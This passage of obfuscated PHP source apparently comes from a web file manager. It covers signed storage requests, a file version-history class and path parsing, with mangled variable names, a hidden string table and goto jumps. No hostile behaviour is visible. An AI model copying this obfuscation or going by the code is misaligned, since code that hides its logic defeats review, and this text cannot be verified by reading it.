explode($¸ñ´·–ö[200], $this->getHost()); $ıµ—ú¨Ë = array($¸ñ´·–ö[1489] => $æÛ…ºÍ[1], $¸ñ´·–ö[242] => $¸ñ´·–ö[122], $¸ñ´·–ö[286] => strlen($Ñä’Ç¨´)); $Ç÷úğ‘Ã = $¸ñ´·–ö[253]; $ì“úåô = $¸ñ´·–ö[8] . $this->pathEncode($¸Î‘©“ø) . $œÍàÈ·Ê[$¸ñ´·–ö[177]]; $§æ‹„£ = $this->client->__getSignatureV4($²„—ÏÚÚ, $ıµ—ú¨Ë, $Ç÷úğ‘Ã, $ì“úåô, $Ñä’Ç¨´); return array($¸ñ´·–ö[260] => $§æ‹„£[$¸ñ´·–ö[260]], $¸ñ´·–ö[251] => $§æ‹„£[$¸ñ´·–ö[1491]], $¸ñ´·–ö[262] => $€²øâ†, $¸ñ´·–ö[1488] => $§æ‹„£[$¸ñ´·–ö[1488]]); } public function link($¶ñßæ Ò, $×°â¬ = array()) { return parent::link($¶ñßæ Ò, $×°â¬); } public function fileOut($‚‰ğÌ, $¾ûÎÅù = false, $¾îşÖŸ = false, $ˆå«âÊƒ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ú‡®¯¨±][1496])) { return parent::fileOutServer($‚‰ğÌ, $¾ûÎÅù, $¾îşÖŸ, $ˆå«âÊƒ); } parent::fileOut($‚‰ğÌ, $¾ûÎÅù, $¾îşÖŸ, $ˆå«âÊƒ); } public function fileOutImage($õ÷Şç„, $ùÕ£çº = 250) { if (strstr($this->endpoint, $_SERVER[ú‡®¯¨±][1496])) { return parent::fileOutImageServer($õ÷Şç„, $ùÕ£çº); } parent::fileOutImage($õ÷Şç„, $ùÕ£çº); } public function fileOutLink($‘ÌÎï¼«) { $Ç°«·ËÉ =& $_SERVER[ú‡®¯¨±]; if (substr($‘ÌÎï¼«, 0, 7) == $Ç°«·ËÉ[1387]) { $‘ÌÎï¼« = $Ç°«·ËÉ[1388] . substr($‘ÌÎï¼«, 7); } header($Ç°«·ËÉ[164] . $‘ÌÎï¼«); die; } public function getHost() { $Ç”‚¢Õ¹ =& $_SERVER[ú‡®¯¨±]; $“Ì„” = str_rtrim(parent::getHost(), $Ç”‚¢Õ¹[8] . $this->bucket); $“Ì„” = explode($Ç”‚¢Õ¹[200], $“Ì„”); return $“Ì„”[0] . $Ç”‚¢Õ¹[200] . $this->bucket . $Ç”‚¢Õ¹[10] . $“Ì„”[1]; } } goto fÄ“È®áî»; b¥îâÈù’½: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $£ĞÀ®“ =& $_SERVER[ú‡®¯¨±]; $£ì®ÊçÀ = $GLOBALS[$£ĞÀ®“[6]][$£ĞÀ®“[91]]; if ($£ì®ÊçÀ[$£ĞÀ®“[1272]] != 1) { return; } if ($£ì®ÊçÀ[$£ĞÀ®“[1273]] <= 0) { return; } if (isset($_REQUEST[$£ĞÀ®“[1274]]) && $_REQUEST[$£ĞÀ®“[1274]] == $£ĞÀ®“[90]) { return; } Hook::bind($£ĞÀ®“[1275], $£ĞÀ®“[1276]); Hook::bind($£ĞÀ®“[1277], $£ĞÀ®“[1278]); Hook::bind($£ĞÀ®“[1279], $£ĞÀ®“[1280]); Hook::bind($£ĞÀ®“[1281], $£ĞÀ®“[1282]); Hook::bind($£ĞÀ®“[1283], $£ĞÀ®“[1284]); Hook::bind($£ĞÀ®“[1285], $£ĞÀ®“[1286]); } public static function eventBeforeUpload($ºëğ¶ìş) { if ($ºëğ¶ìş[3] && $ºëğ¶ìş[3] != REPEAT_REPLACE) { return; } $‡òŒù²õ = self::parsePath($ºëğ¶ìş[0]); if (!$‡òŒù²õ) { return; } self::add($‡òŒù²õ); } public static function eventBeforeEdit($»Ğ„œõ‰) { $ƒó÷®•· = self::parsePath($»Ğ„œõ‰[0]); if (!$ƒó÷®•·) { return; } self::add($ƒó÷®•·); } public static function eventBeforeCopyFile($³Ì™Ÿë, $Ê•¦âæİ, $ØÚ³ßºú, $¹ë®·ü™, $õÌ¤±¯, $˜êğ‰ş„) { $³çú°Æ =& $_SERVER[ú‡®¯¨±]; if (isset($ØÚ³ßºú->_data[$³çú°Æ[1211]]) && $ØÚ³ßºú->_data[$³çú°Æ[1211]]) { return; } $çÙ¸Û·’ = $ØÚ³ßºú->getPathOuter($¹ë®·ü™); $±§‡™„‚ = self::parsePath($çÙ¸Û·’); if (!$±§‡™„‚) { return; } self::add($±§‡™„‚); } public static function eventBeforeRename($ß—ˆıª«) { $İ¨æ°› =& $_SERVER[ú‡®¯¨±]; $¥°ì› Ò = self::parsePath($ß—ˆıª«[0]); if (!$¥°ì› Ò) { return; } $÷Ö°Û = self::checkInHistory($¥°ì› Ò); if (!$÷Ö°Û) { return; } if ($÷Ö°Û[$İ¨æ°›[33]] == $İ¨æ°›[226]) { $Î’í²Ë¨ = self::listData($¥°ì› Ò); if ($Î’í²Ë¨ && $Î’í²Ë¨[$İ¨æ°›[424]]) { self::moveHistory($¥°ì› Ò, $ß—ˆıª«[1]); } } else { IO::rename($÷Ö°Û[$İ¨æ°›[86]], $ß—ˆıª«[1]); } } public static function eventBeforeMove($Ÿœş‡¿Ü) { $Ñ–ß¢à =& $_SERVER[ú‡®¯¨±]; $ÇÙÖ¾˜„ = self::parsePath($Ÿœş‡¿Ü[0]); if (!$ÇÙÖ¾˜„) { return; } $èÚ±éĞÑ = self::parsePath($Ÿœş‡¿Ü[1]); if (!$èÚ±éĞÑ) { return; } $Í¶ÃÔá¥ = $Ÿœş‡¿Ü[3]; $‰—§–¢¼ = self::checkInHistory($ÇÙÖ¾˜„); if (!$‰—§–¢¼) { return; } $àØÖ‹ = self::pathHistory($èÚ±éĞÑ); if ($‰—§–¢¼[$Ñ–ß¢à[33]] == $Ñ–ß¢à[226]) { $¿ëı¼ùü = self::listData($ÇÙÖ¾˜„); $µå¹ˆõû = rtrim($èÚ±éĞÑ, $Ñ–ß¢à[8]) . $Ñ–ß¢à[8] . ($Í¶ÃÔá¥ ? $Í¶ÃÔá¥ : get_path_this($ÇÙÖ¾˜„)); $¹ïû´“ß = self::listData($µå¹ˆõû); if ($¿ëı¼ùü && $¿ëı¼ùü[$Ñ–ß¢à[424]] && $¹ïû´“ß && $¹ïû´“ß[$Ñ–ß¢à[424]]) { return self::clear($ÇÙÖ¾˜„); } if ($¿ëı¼ùü && $¿ëı¼ùü[$Ñ–ß¢à[424]]) { self::moveHistory($ÇÙÖ¾˜„, $Í¶ÃÔá¥, $àØÖ‹); } } else { IO::move($‰—§–¢¼[$Ñ–ß¢à[86]], $àØÖ‹, !1, $Í¶ÃÔá¥); self::clearEmptyFolder(IO::pathFather($‰—§–¢¼[$Ñ–ß¢à[86]])); } } public static function eventAfterRemove($ıš¿š£¦, $ê–şÆî) { $³‘öÚÇì =& $_SERVER[ú‡®¯¨±]; if (!$ê–şÆî) { return; } $¾´®—º = self::parsePath($ıš¿š£¦[0]); if (!$¾´®—º) { return; } $ŒİÎ®›É = self::checkInHistory($¾´®—º); if (!$ŒİÎ®›É) { return; } if ($ŒİÎ®›É[$³‘öÚÇì[33]] == $³‘öÚÇì[226]) { $ÒÁÀ’¥Æ = self::listData($¾´®—º, !1); if ($ÒÁÀ’¥Æ && $ÒÁÀ’¥Æ[$³‘öÚÇì[424]]) { self::clear($¾´®—º, !1); } } else { IO::remove($ŒİÎ®›É[$³‘öÚÇì[86]]); self::clearEmptyFolder(IO::pathFather($ŒİÎ®›É[$³‘öÚÇì[86]])); } } private static function checkInHistory($ò² ´Ÿ¿) { $óãà§×ƒ = self::pathHistory($ò² ´Ÿ¿); if (!IO::exist($óãà§×ƒ)) { $óãà§×ƒ .= $_SERVER[ú‡®¯¨±][1287]; } return IO::exist($óãà§×ƒ) ? IO::info($óãà§×ƒ) : !1; } private static function parsePath($¨°‡Äı) { $ÓÏ”ô’“ =& $_SERVER[ú‡®¯¨±]; if (!$¨°‡Äı) { return !1; } if ($GLOBALS[$ÓÏ”ô’“[1288]]) { return; } $™Üıõø¥ = KodIO::parse($¨°‡Äı); $¹‡Ø¿ = $™Üıõø¥[$ÓÏ”ô’“[33]]; $…ƒ‡•‰ß = !$¹‡Ø¿ || $¹‡Ø¿ == KodIO::KOD_IO || $¹‡Ø¿ == KodIO::KOD_SHARE_ITEM; if (!$…ƒ‡•‰ß || !$™Üıõø¥[$ÓÏ”ô’“[1289]]) { return !1; } if (substr($¨°‡Äı, 0, strlen(DATA_PATH . $ÓÏ”ô’“[1290])) == DATA_PATH . $ÓÏ”ô’“[1290]) { return !1; } if ($¹‡Ø¿ == KodIO::KOD_SHARE_ITEM) { $ãšÓóÚâ = IO::init($¨°‡Äı); if ($ãšÓóÚâ->pathParse[$ÓÏ”ô’“[1207]]) { return self::parsePath($ãšÓóÚâ->pathParse[$ÓÏ”ô’“[1207]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $«€·´„§ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $ÓÏ”ô’“[1291]); foreach ($«€·´„§ as $£åßøÚ˜) { if (!$¹‡Ø¿ && substr($¨°‡Äı, 0, strlen($£åßøÚ˜)) == $£åßøÚ˜) { return !1; } } self::log($GLOBALS[$ÓÏ”ô’“[1202]] . $ÓÏ”ô’“[1292] . $¨°‡Äı); return $¨°‡Äı; } private static function pathHistory($ÑàúÔÜ) { $ıæ„¸¸… =& $_SERVER[ú‡®¯¨±]; $õùÊŒ˜ = self::$_historyBase . ltrim(KodIO::clear($ÑàúÔÜ), $ıæ„¸¸…[8]); $õùÊŒ˜ = str_replace(array($ıæ„¸¸…[1293]), array($ıæ„¸¸…[1294]), $õùÊŒ˜); return $õùÊŒ˜; } public static function log($¿ıµæ’î) { } public static function historyCount($ãõ Ü†‚) { $¢º­•ÁØ =& $_SERVER[ú‡®¯¨±]; $£Ë”§äÍ = array(); $ûê†½¢ò = array(); foreach ($ãõ Ü†‚ as $±üã¥) { $¦î’ñõø = get_path_father($±üã¥); if (!$ûê†½¢ò[$¦î’ñõø]) { $ûê†½¢ò[$¦î’ñõø] = array(); } $ûê†½¢ò[$¦î’ñõø][] = get_path_this($±üã¥); } foreach ($ûê†½¢ò as $¦î’ñõø => $ÇË´¨•) { $Ğ™¢Ì¾ù = self::parsePath($¦î’ñõø); if (!$Ğ™¢Ì¾ù) { continue; } foreach ($ÇË´¨• as $Ú¤¾ß“) { $¥½Óíû­ = self::listData(rtrim($Ğ™¢Ì¾ù, $¢º­•ÁØ[8]) . $¢º­•ÁØ[8] . $Ú¤¾ß“, !1); if ($¥½Óíû­ && $¥½Óíû­[$¢º­•ÁØ[424]]) { $£Ë”§äÍ[rtrim($¦î’ñõø, $¢º­•ÁØ[8]) . $¢º­•ÁØ[8] . $Ú¤¾ß“] = count($¥½Óíû­[$¢º­•ÁØ[424]]); } } } return $£Ë”§äÍ; } public static function add($Ø½áÔ›œ) { $·ê¬«“Å =& $_SERVER[ú‡®¯¨±]; $ª€Ç‡ğõ = self::listData($Ø½áÔ›œ); if (!$ª€Ç‡ğõ) { return; } $´»ºÕê× = Model($·ê¬«“Å[825])->get($·ê¬«“Å[1295]); $Ò–âÀÉ¥ = intval($GLOBALS[$·ê¬«“Å[6]][$·ê¬«“Å[91]][$·ê¬«“Å[1273]]); $†ç‘‚÷æ = $´»ºÕê× == $·ê¬«“Å[1296] ? min(5, $Ò–âÀÉ¥) : $Ò–âÀÉ¥; if ($Ò–âÀÉ¥ <= 0) { return; } $™î³„´… = IO::info($Ø½áÔ›œ); $ÔÖ•ïÙÂ = $ª€Ç‡ğõ[$·ê¬«“Å[424]]; if ($™î³„´…[$·ê¬«“Å[78]] == 0) { return; } if ($™î³„´…[$·ê¬«“Å[78]] >= 1024 * 1024 * 500) { return !1; } $Á‰Ãä = IO::hashSimple($Ø½áÔ›œ); if ($ÔÖ•ïÙÂ && $ÔÖ•ïÙÂ[0][$·ê¬«“Å[650]] == $Á‰Ãä) { return !0; } if (array_key_exists($·ê¬«“Å[229], $™î³„´…) && !$™î³„´…[$·ê¬«“Å[229]]) { return !1; } $³ ÕÑƒ = short_id(time()); $ì×¾Ë”Ö = array($·ê¬«“Å[453] => $³ ÕÑƒ, $·ê¬«“Å[650] => $Á‰Ãä, $·ê¬«“Å[32] => $™î³„´…[$·ê¬«“Å[32]] . $·ê¬«“Å[10] . date($·ê¬«“Å[1297]) . rand_string(1), $·ê¬«“Å[78] => $™î³„´…[$·ê¬«“Å[78]], $·ê¬«“Å[505] => USER_ID, $·ê¬«“Å[227] => time(), $·ê¬«“Å[1298] => $·ê¬«“Å[12]); IO::mkdir($ª€Ç‡ğõ[$·ê¬«“Å[1299]]); $úÕÈÍ¥ = IO::copy($Ø½áÔ›œ, $ª€Ç‡ğõ[$·ê¬«“Å[1299]], !1, $ì×¾Ë”Ö[$·ê¬«“Å[32]]); if (!$úÕÈÍ¥) { self::clearEmptyFolder($ª€Ç‡ğõ[$·ê¬«“Å[1299]]); return !1; } array_unshift($ÔÖ•ïÙÂ, $ì×¾Ë”Ö); if (count($ÔÖ•ïÙÂ) > $†ç‘‚÷æ) { $–ı˜‘İ = array_slice($ÔÖ•ïÙÂ, $†ç‘‚÷æ); foreach ($–ı˜‘İ as $›ŠÍ°¼Š) { IO::remove($ª€Ç‡ğõ[$·ê¬«“Å[1299]] . $›ŠÍ°¼Š[$·ê¬«“Å[32]]); } $ÔÖ•ïÙÂ = array_slice($ÔÖ•ïÙÂ, 0, $†ç‘‚÷æ); } return self::saveData($ª€Ç‡ğõ[$·ê¬«“Å[1300]], $ÔÖ•ïÙÂ); } public static function remove($Úàø¿¯â, $”üÃµØË) { $§ìâà·Ş =& $_SERVER[ú‡®¯¨±]; $ñÛåùı = self::listData($Úàø¿¯â); $—º³‡¥Õ = array(); if (!$ñÛåùı) { return !1; } foreach ($ñÛåùı[$§ìâà·Ş[424]] as $÷´Ó‰Á¼) { if ($÷´Ó‰Á¼[$§ìâà·Ş[453]] == $”üÃµØË) { IO::remove($ñÛåùı[$§ìâà·Ş[1299]] . $÷´Ó‰Á¼[$§ìâà·Ş[32]]); continue; } $—º³‡¥Õ[] = $÷´Ó‰Á¼; } return self::saveData($ñÛåùı[$§ìâà·Ş[1300]], $—º³‡¥Õ); } public static function clear($ÌÓÏäŒŒ, $ÂÏ²İ•» = true) { $ùÍ“Ùµ… =& $_SERVER[ú‡®¯¨±]; $Õ©ş½¡ƒ = self::listData($ÌÓÏäŒŒ, $ÂÏ²İ•»); if (!$Õ©ş½¡ƒ) { return !1; } foreach ($Õ©ş½¡ƒ[$ùÍ“Ùµ…[424]] as $†ÊƒëÍ¡) { IO::remove($Õ©ş½¡ƒ[$ùÍ“Ùµ…[1299]] . $†ÊƒëÍ¡[$ùÍ“Ùµ…[32]]); } return self::saveData($Õ©ş½¡ƒ[$ùÍ“Ùµ…[1300]], array()); } public static function moveHistory($‚«Ëã—…, $‘¡ÈÓ— = '', $ÎŒŠò›÷ = '') { $Ä²Ğ… =& $_SERVER[ú‡®¯¨±]; $·Áı‚«ó = self::listData($‚«Ëã—…, !1); if (!$·Áı‚«ó || !$·Áı‚«ó[$Ä²Ğ…[424]]) { return !1; } $áÛÇĞğı = $Ä²Ğ…[1287]; $‘¡ÈÓ— = $‘¡ÈÓ— ? $‘¡ÈÓ— : get_path_this($‚«Ëã—…); $ÎŒŠò›÷ = $ÎŒŠò›÷ ? $ÎŒŠò›÷ : $·Áı‚«ó[$Ä²Ğ…[1299]]; $ğ¨ÙòÊî = substr(get_path_this($·Áı‚«ó[$Ä²Ğ…[1300]]), 0, -strlen($áÛÇĞğı)); foreach ($·Áı‚«ó[$Ä²Ğ…[424]] as $ÙÖÇºã => $ÕÌ—¤Ò) { $›éáîÖü = $‘¡ÈÓ— . substr($ÕÌ—¤Ò[$Ä²Ğ…[32]], strlen($ğ¨ÙòÊî)); $ÌÃ„šğˆ = IO::move($·Áı‚«ó[$Ä²Ğ…[1299]] . $ÕÌ—¤Ò[$Ä²Ğ…[32]], $ÎŒŠò›÷, !1, $›éáîÖü); if ($ÌÃ„šğˆ) { $·Áı‚«ó[$Ä²Ğ…[424]][$ÙÖÇºã][$Ä²Ğ…[32]] = $›éáîÖü; } } $·Áı‚«ó[$Ä²Ğ…[1300]] = IO::move($·Áı‚«ó[$Ä²Ğ…[1300]], $ÎŒŠò›÷, !1, $‘¡ÈÓ— . $áÛÇĞğı); self::saveData($·Áı‚«ó[$Ä²Ğ…[1300]], $·Áı‚«ó[$Ä²Ğ…[424]]); self::clearEmptyFolder($·Áı‚«ó[$Ä²Ğ…[1299]]); } public static function rollback($Ğ·‹áèĞ, $°“£üÃİ) { $±µÓû¿ =& $_SERVER[ú‡®¯¨±]; $¬ŠúïÄ = self::listData($Ğ·‹áèĞ); if (!$¬ŠúïÄ) { return; } $œÈæ“·ƒ = IO::info($Ğ·‹áèĞ); foreach ($¬ŠúïÄ[$±µÓû¿[424]] as $ĞïÉ–êì => $éÛ¼¥à) { if ($éÛ¼¥à[$±µÓû¿[453]] == $°“£üÃİ) { self::add($Ğ·‹áèĞ); $Õé’¤ş× = $¬ŠúïÄ[$±µÓû¿[1299]] . $éÛ¼¥à[$±µÓû¿[32]]; $ˆ¤Ô‡˜ø = IO::copy($Õé’¤ş×, IO::pathFather($Ğ·‹áèĞ), REPEAT_REPLACE, $œÈæ“·ƒ[$±µÓû¿[32]]); if ($ˆ¤Ô‡˜ø) { self::remove($Ğ·‹áèĞ, $°“£üÃİ); } return $ˆ¤Ô‡˜ø; } } return !1; } public static function setDetail($•”ÅÖŞÀ, $§Å›¡, $á‘Â–š•) { $ä…”˜Ñ =& $_SERVER[ú‡®¯¨±]; $ô–Ñ¢¶„ = self::listData($•”ÅÖŞÀ); if (!$ô–Ñ¢¶„) { return; } foreach ($ô–Ñ¢¶„[$ä…”˜Ñ[424]] as $¶ñá æö => $ ¾İÁÓÏ) { if ($ ¾İÁÓÏ[$ä…”˜Ñ[453]] == $§Å›¡) { $ô–Ñ¢¶„[$ä…”˜Ñ[424]][$¶ñá æö][$ä…”˜Ñ[1298]] = $á‘Â–š•; self::saveData($ô–Ñ¢¶„[$ä…”˜Ñ[1300]], $ô–Ñ¢¶„[$ä…”˜Ñ[424]]); return !0; } } return !1; } public static function fileInfo($êÚ§¾ğ, $É¡¢›²€) { $„÷“û· =& $_SERVER[ú‡®¯¨±]; $õèãõ²¤ = self::listData($êÚ§¾ğ); if (!$õèãõ²¤) { show_json(LNG($„÷“û·[107]), !1); } $ÊÁï­ê = $„÷“û·[12]; foreach ($õèãõ²¤[$„÷“û·[424]] as $ªˆ–åÇğ => $ô¸ûÃ¥) { if ($ô¸ûÃ¥[$„÷“û·[453]] != $É¡¢›²€) { continue; } $ÊÁï­ê = $õèãõ²¤[$„÷“û·[1299]] . $ô¸ûÃ¥[$„÷“û·[32]]; break; } if (!$ÊÁï­ê) { show_json(LNG($„÷“û·[107]), !1); } return IO::info($ÊÁï­ê); } public static function fileOut($˜Ò…´şƒ, $•ÅÙİ¨›, $®‰ƒ›… = false) { $‘Ù”ûÇ€ =& $_SERVER[ú‡®¯¨±]; $•·îóÍÜ = self::fileInfo($˜Ò…´şƒ, $•ÅÙİ¨›); $·«ËßßÕ =& $GLOBALS[$‘Ù”ûÇ€[7]]; $®‰ƒ›… = isset($·«ËßßÕ[$‘Ù”ûÇ€[1250]]) && $·«ËßßÕ[$‘Ù”ûÇ€[1250]] == 1; if (isset($·«ËßßÕ[$‘Ù”ûÇ€[33]]) && $·«ËßßÕ[$‘Ù”ûÇ€[33]] == $‘Ù”ûÇ€[1301]) { return IO::fileOutImage($•·îóÍÜ[$‘Ù”ûÇ€[86]], $·«ËßßÕ[$‘Ù”ûÇ€[1302]]); } IO::fileOut($•·îóÍÜ[$‘Ù”ûÇ€[86]], $®‰ƒ›…, get_path_this($˜Ò…´şƒ)); } public static function listData($È‘±àÓî, $‚óÀÅÓ = true) { $¨«™¢« =& $_SERVER[ú‡®¯¨±]; if ($‚óÀÅÓ && !IO::exist($È‘±àÓî)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($È‘±àÓî, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $µÅíûãÉ = self::pathHistory($È‘±àÓî); $ƒûÃ•ÆŒ = array($¨«™¢«[1300] => $µÅíûãÉ . $¨«™¢«[1287], $¨«™¢«[1299] => rtrim(get_path_father($µÅíûãÉ), $¨«™¢«[8]) . $¨«™¢«[8], $¨«™¢«[424] => array()); $¨İÛÉ•¬ = IO::getContent($ƒûÃ•ÆŒ[$¨«™¢«[1300]]); if ($¨İÛÉ•¬) { $„¿Í¤ù = json_decode($¨İÛÉ•¬, !0); if (is_array($„¿Í¤ù)) { $ƒûÃ•ÆŒ[$¨«™¢«[424]] = $„¿Í¤ù; } } return $ƒûÃ•ÆŒ; } private static function saveData($¤€¤ÙØ«, $Ú÷Û©Øˆ) { $ã×ûÂÚÆ =& $_SERVER[ú‡®¯¨±]; self::log($ã×ûÂÚÆ[1303] . $¤€¤ÙØ« . $ã×ûÂÚÆ[73] . count($Ú÷Û©Øˆ), $ã×ûÂÚÆ[806]); if ($Ú÷Û©Øˆ) { return IO::setContent($¤€¤ÙØ«, json_encode($Ú÷Û©Øˆ)); } $À²½ªşÊ = IO::pathFather($¤€¤ÙØ«); IO::remove($¤€¤ÙØ«); self::clearEmptyFolder($À²½ªşÊ); return !0; } public static function clearEmptyFolder($Ôµ¹ªüá) { $•œÊŞ¾„ =& $_SERVER[ú‡®¯¨±]; if (trim($Ôµ¹ªüá, $•œÊŞ¾„[8]) == trim(self::$_historyBase, $•œÊŞ¾„[8])) { return; } $œõÁêè = IO::pathFather($Ôµ¹ªüá); $¿Û¹æ²Û = IO::has($Ôµ¹ªüá, !0); if ($¿Û¹æ²Û[$•œÊŞ¾„[235]] > 0 || $¿Û¹æ²Û[$•œÊŞ¾„[236]] > 0) { return; } IO::remove($Ôµ¹ªüá); self::clearEmptyFolder($œõÁêè); } private static function getBasePath() { $®µæ´ë =& $_SERVER[ú‡®¯¨±]; $†øçóãû = Model($®µæ´ë[1304])->get($®µæ´ë[1305]); if ($†øçóãû) { if (!IO::exist($†øçóãû)) { IO::mkdir($†øçóãû); } if (get_path_this($†øçóãû) == $®µæ´ë[1290]) { $É·¥ŠÅ = $®µæ´ë[1306] . rand_string(8); @rename($†øçóãû, get_path_father($†øçóãû) . $®µæ´ë[8] . $É·¥ŠÅ); $†øçóãû = DATA_PATH . $É·¥ŠÅ . $®µæ´ë[8]; file_put_contents(DATA_PATH . $®µæ´ë[1240], $®µæ´ë[12]); Model($®µæ´ë[1304])->set($®µæ´ë[1305], $†øçóãû); } return $†øçóãû; } $†øçóãû = DATA_PATH . $®µæ´ë[1306] . rand_string(8) . $®µæ´ë[8]; $†øçóãû = IO::mkdir($†øçóãû); $†øçóãû = rtrim($†øçóãû, $®µæ´ë[8]) . $®µæ´ë[8]; file_put_contents($†øçóãû . $®µæ´ë[1240], $®µæ´ë[12]); file_put_contents(DATA_PATH . $®µæ´ë[1240], $®µæ´ë[12]); Model($®µæ´ë[1304])->set($®µæ´ë[1305], $†øçóãû); return $†øçóãû; } } class KodIO { const KOD_SOURCE = "\173\x73\157\165\x72\143\x65\175"; const KOD_USER_RECYCLE = "\173\165\163\x65\162\x52\x65\143\x79\143\154\145\x7d"; const KOD_USER_FAV = "\x7b\x75\x73\x65\x72\x46\141\166\175"; const KOD_USER_FILE_TAG = "\173\x75\x73\145\x72\106\151\154\145\124\141\x67\175"; const KOD_USER_FILE_TYPE = "\x7b\x75\163\145\162\106\x69\x6c\145\124\x79\160\x65\175"; const KOD_GROUP_ROOT_SELF = "\173\147\x72\x6f\x75\x70\x52\x6f\157\x74\123\145\154\146\x7d"; const KOD_USER_SHARE = "\x7b\165\163\145\162\x53\150\x61\x72\145\x7d"; const KOD_USER_SHARE_LINK = "\173\165\163\145\162\123\150\141\162\x65\x4c\151\156\153\x7d"; const KOD_USER_SHARE_TO_ME = "\173\163\150\141\x72\x65\x54\x6f\x4d\x65\175"; const KOD_SHARE_ITEM = "\173\x73\x68\141\162\x65\x49\x74\145\x6d\175"; const KOD_SHARE_LINK = "\173\163\150\141\x72\145\x49\164\145\155\x4c\x69\x6e\153\175"; const KOD_SEARCH = "\x7b\163\x65\x61\162\x63\150\x7d"; const KOD_BLOCK = "\x7b\142\x6c\x6f\143\x6b\175"; const KOD_IO = "\173\x69\x6f\175"; const KOD_USER_RECENT = "\x7b\165\x73\x65\x72\x52\x65\x6e\143\x65\156\164\175"; const KOD_USER_DRIVER = "\173\x64\162\151\x76\145\162\x7d"; public static function typeList() { $©‡İ †Ü =& $_SERVER[ú‡®¯¨±]; return array($©‡İ †Ü[1307] => self::KOD_SOURCE, $©‡İ †Ü[1308] => self::KOD_USER_RECYCLE, $©‡İ †Ü[1309] => self::KOD_USER_FAV, $©‡İ †Ü[1310] => self::KOD_USER_FILE_TAG, $©‡İ †Ü[1311] => self::KOD_USER_FILE_TYPE, $©‡İ †Ü[1312] => self::KOD_GROUP_ROOT_SELF, $©‡İ †Ü[1313] => self::KOD_USER_SHARE, $©‡İ †Ü[1314] => self::KOD_USER_SHARE_LINK, $©‡İ †Ü[1315] => self::KOD_USER_SHARE_TO_ME, $©‡İ †Ü[1316] => self::KOD_SHARE_ITEM, $©‡İ †Ü[1317] => self::KOD_SHARE_LINK, $©‡İ †Ü[1318] => self::KOD_SEARCH, $©‡İ †Ü[1319] => self::KOD_BLOCK, $©‡İ †Ü[1320] => self::KOD_IO, $©‡İ †Ü[1321] => self::KOD_USER_RECENT, $©‡İ †Ü[1322] => self::KOD_USER_DRIVER); } public static function parse($Ø÷óùû) { $İê½‰•ô =& $_SERVER[ú‡®¯¨±]; $Ø÷óùû = self::clear($Ø÷óùû); $Í¨§ã½ = array_values(self::typeList()); preg_match($İê½‰•ô[1323], $Ø÷óùû, $Êï°»¶); $£“œ“ = array($İê½‰•ô[474] => !1, $İê½‰•ô[1324] => !1, $İê½‰•ô[471] => !1, $İê½‰•ô[86] => $Ø÷óùû, $İê½‰•ô[1225] => !1, $İê½‰•ô[1224] => $İê½‰•ô[12]); if (is_array($Êï°»¶) && count($Êï°»¶) == 5) { $›¦ºüİ­ = $İê½‰•ô[1325] . $Êï°»¶[2] . $İê½‰•ô[382]; if (in_array($›¦ºüİ­, $Í¨§ã½)) { $£“œ“[$İê½‰•ô[1225]] = $Êï°»¶[1]; $£“œ“[$İê½‰•ô[33]] = $›¦ºüİ­; $£“œ“[$İê½‰•ô[1326]] = substr($›¦ºüİ­, 1, -1); $£“œ“[$İê½‰•ô[453]] = $Êï°»¶[3]; } $£“œ“[$İê½‰•ô[1224]] = $Êï°»¶[4]; } $µŸŸ•œÀ = array($İê½‰•ô[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $£“œ“[$İê½‰•ô[1289]] = in_array($£“œ“[$İê½‰•ô[33]], $µŸŸ•œÀ); return $£“œ“; } public static function isTruePath($¿şÅøÓ) { $³ÌåöÈÕ =& $_SERVER[ú‡®¯¨±]; if (substr($¿şÅøÓ, 0, 1) != $³ÌåöÈÕ[1325]) { return !0; } if (strpos($¿şÅøÓ, $³ÌåöÈÕ[461]) === 0) { return !0; } if (strpos($¿şÅøÓ, $³ÌåöÈÕ[1293]) === 0) { return !0; } if (strpos($¿şÅøÓ, $³ÌåöÈÕ[1327]) === 0) { return !0; } if (strpos($¿şÅøÓ, $³ÌåöÈÕ[1328]) === 0) { return !0; } if (strpos($¿şÅøÓ, $³ÌåöÈÕ[1329]) === 0) { return !0; } return !1; } public static function clear($Æ–Ÿ¯ö) { $­˜Õ¬Ñ´ =& $_SERVER[ú‡®¯¨±]; $Æ–Ÿ¯ö = str_replace(array($­˜Õ¬Ñ´[1134], $­˜Õ¬Ñ´[207]), $­˜Õ¬Ñ´[53], $Æ–Ÿ¯ö); $Æ–Ÿ¯ö = str_replace($­˜Õ¬Ñ´[99], $­˜Õ¬Ñ´[8], $Æ–Ÿ¯ö); $®Èß»€Ì = $­˜Õ¬Ñ´[1330]; if (substr($Æ–Ÿ¯ö, 0, 3) == $­˜Õ¬Ñ´[1331]) { $Æ–Ÿ¯ö = substr($Æ–Ÿ¯ö, 3); } while (strstr($Æ–Ÿ¯ö, $®Èß»€Ì)) { $Æ–Ÿ¯ö = str_replace($®Èß»€Ì, $­˜Õ¬Ñ´[8], $Æ–Ÿ¯ö); } $Æ–Ÿ¯ö = preg_replace($­˜Õ¬Ñ´[1332], $­˜Õ¬Ñ´[8], $Æ–Ÿ¯ö); if ($Æ–Ÿ¯ö == $­˜Õ¬Ñ´[8]) { return $­˜Õ¬Ñ´[8]; } $Æ–Ÿ¯ö = rtrim($Æ–Ÿ¯ö, $­˜Õ¬Ñ´[8]); return $Æ–Ÿ¯ö; } public static function pathTrue($€—Ù–«ê) { $ªêƒË×ê =& $_SERVER[ú‡®¯¨±]; if (!$€—Ù–«ê) { return $ªêƒË×ê[12]; } $€—Ù–«ê = str_replace($ªêƒË×ê[571], $ªêƒË×ê[8], str_replace($ªêƒË×ê[1333], $ªêƒË×ê[8], $€—Ù–«ê)); $€—Ù–«ê = str_replace($ªêƒË×ê[571], $ªêƒË×ê[8], str_replace($ªêƒË×ê[1333], $ªêƒË×ê[8], $€—Ù–«ê)); if (!strstr($€—Ù–«ê, $ªêƒË×ê[1331])) { return $€—Ù–«ê; } $Õ±³Â = explode($ªêƒË×ê[8], $€—Ù–«ê); foreach ($Õ±³Â as $şŞ—”üì => $Ü†™²Ó) { if ($Ü†™²Ó !== 